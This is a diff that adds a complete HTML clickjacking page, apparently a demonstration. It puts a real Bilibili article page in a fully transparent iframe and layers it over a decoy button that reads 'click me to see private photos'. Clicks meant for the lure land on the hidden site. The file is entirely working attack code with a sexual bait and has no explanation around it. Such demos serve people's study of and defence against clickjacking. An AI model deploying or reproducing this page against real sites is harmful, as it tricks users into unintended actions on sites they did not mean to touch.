@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<head>
+    <title>点击劫持</title>
+    <style>
+        iframe {
+            width: 1440px;
+            height: 900px;
+            position: absolute;
+            top: -0px;
+            left: -0px;
+            z-index: 2;
+            -moz-opacity: 0;
+            opacity: 0;
+            filter: alpha(opacity=0);
+        }
+
+        button {
+            position: absolute;
+            top: 138px;
+            left: 1128px;
+            z-index: 1;
+            width: 120px;
+            height: 40px;
+        }
+    </style>
+</head>
+<body>
+<button>点我查看私房照</button>
+<img style="width: 1440px;height: 900px"
+     src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=299762812,1164673512&fm=26&gp=0.jpg">
+<iframe src="https://www.bilibili.com/read/cv4161225?from=1002&spm_id_from=333.851.b_7265706f7274466972737431.3"
+        scrolling="no"></iframe>
+</body>
+</html>
